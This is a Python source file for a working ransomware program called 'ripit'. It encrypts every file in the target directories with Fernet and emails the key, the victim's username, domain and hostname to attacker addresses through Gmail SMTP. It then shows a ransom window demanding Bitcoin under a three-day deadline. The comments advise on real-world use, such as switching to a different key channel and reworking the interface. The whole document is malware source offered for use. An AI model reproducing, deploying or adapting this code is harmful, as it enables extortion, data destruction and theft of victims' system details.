from cryptography.fernet import Fernet
import os
import smtplib
import socket
import tkinter as tk
import tkinter.ttk as ttk
from ctypes import windll

# All file paths to be encrypted can be specified here, example: DirectorysToEncrypt = ["C:\Users", "\\<IP-ADDRESS>", "C:\Users\<victim_username>\OneDrive"]
DirectorysToEncrypt = ["test"]

GWL_EXSTYLE=-20
WS_EX_APPWINDOW=0x00040000
WS_EX_TOOLWINDOW=0x00000080

def create_key():
    key = Fernet.generate_key()

    # In order to send the key to the attacker, a simple e-mail will be sent via Google Mailserver. In a real attack, 
    # it would be advisable to send the key to the attacker via a different channel. 
    gmail_user = 'username@gmail.com'
    gmail_password = 'password'

    victim_username = os.getlogin()
    victim_domainname = os.environ['userdomain']
    victim_computername = socket.gethostname()
    sent_from = gmail_user
    to = ['username2@gmail.com', 'username3@gmail.com']
    subject = 'MALWARE'
    body = 'USERNAME: ' + victim_username + "\nDOMAINNAME: " + victim_domainname + "\nCOMPUTERNAME: " + victim_computername + "\nKEY: " + str(key)
    email_text = """\
    From: %s
    To: %s
    Subject: %s
    %s
    """ % (sent_from, ", ".join(to), subject, body)

    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.ehlo()
        server.login(gmail_user, gmail_password)
        server.sendmail(sent_from, to, email_text)
        server.close()

    except:
        print('Email could not be sent')
    
    return key

# In this method, the content of the file is read, then encrypted and finally overwritten. 
def encrypt(filename, key):
    try:
        f = Fernet(key)

        # Read the contents of the file
        with open(filename, "rb") as file:
            file_data = file.read()

        # Encrypt the content
        encrypted_data = f.encrypt(file_data)

        # Write the content back into the file
        with open(filename, "wb") as file:
            file.write(encrypted_data)
            print(filename + " has been encrypted")
    except:
        # In cases where files have already been opened, it may be that the file cannot be overwritten, in which case this condition applies.
        print(filename + " could not be encrypted")

# In this method, exactly the same thing happens as in this one, where the files get encrypted, except that the files get decrypted
def decrypt(filename, key):
    try:
        f = Fernet(key)
        with open(filename, "rb") as file:
            encrypted_data = file.read()
        decrypted_data = f.decrypt(encrypted_data)
        with open(filename, "wb") as file:
            file.write(decrypted_data)
            print(filename + " was decrypted")
    except:
        print(filename + " could not be decrypted")

def ripit(key, typ):

    # Apply the following to all previously listed folders, than to all subfolders as well as files
    for folder in DirectorysToEncrypt:
        for dirpath, dirnames, filenames in os.walk(folder):
            for filename in [f for f in filenames]:
                path = os.path.join(dirpath, filename)
                # If the variable "typ" is equal to 0, decrypt the files, in all other cases encrypt the files.
                if typ == 0:
                    # decrypt the File based on the path and key
                    decrypt(path, key)
                else:
                    # encrypt the File based on the path and key
                    encrypt(path, key)

# When the following method is called, the decryption starts
def decryptStart(entry_value):
    ripit(entry_value, 0)

# The following code is only for the visual view, which appears after the malware has been executed. 
# This was programmed in a quick and dirty way, I would recommend changing it if you use the malware.
def set_appwindow(root):
    hwnd = windll.user32.GetParent(root.winfo_id())
    style = windll.user32.GetWindowLongPtrW(hwnd, GWL_EXSTYLE)
    style = style & ~WS_EX_TOOLWINDOW
    style = style | WS_EX_APPWINDOW
    res = windll.user32.SetWindowLongPtrW(hwnd, GWL_EXSTYLE, style)
    # re-assert the new window style
    root.wm_withdraw()
    root.after(10, lambda: root.wm_deiconify())

def main():
    root = tk.Tk()
    root.overrideredirect(True)
    root.after(10, lambda: set_appwindow(root))
    root.geometry("700x400")
    root.configure(bg='black')
    root.eval('tk::PlaceWindow . center')
    root.title("ripit")

    label = tk.Label(
        text="Ooooops, your important files are encrypted",
        fg="red",
        bg="black",
        width=100,
        height=2,
        font=("Arial", 25)
    )

    label2 = tk.Label(
        text="If you need your files back, transfer $X to the following Bitcoin address: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX and then use the key we sent you to decrypt your files. WE ADVISE YOU NOT TO USE A WRONG KEY! AFTER YOU USE A WRONG KEY YOUR FILES ARE LOST! ",
        fg="red",
        bg="black",
        width=100,
        height=6,
        font=("Arial", 12),
        wraplengt=600
    )

    entry = tk.Entry(
        width=50
    )

    button = tk.Button(
        text="CHECK KEY",
        width=20,
        height=2,
        bg="red",
        fg="yellow",
        command = lambda:[decryptStart(entry.get()), root.destroy()]
    )

    label3 = tk.Label(
        fg="red",
        text="3 DAYS LEFT",
        bg="black",
        font=("Arial", 28)
    )

    label3.place(x=210, y=300)

    label.pack()
    label2.pack()
    entry.pack()
    button.pack()

    root.mainloop()

key = create_key()
ripit(key, 1)

if __name__ == '__main__':
    main()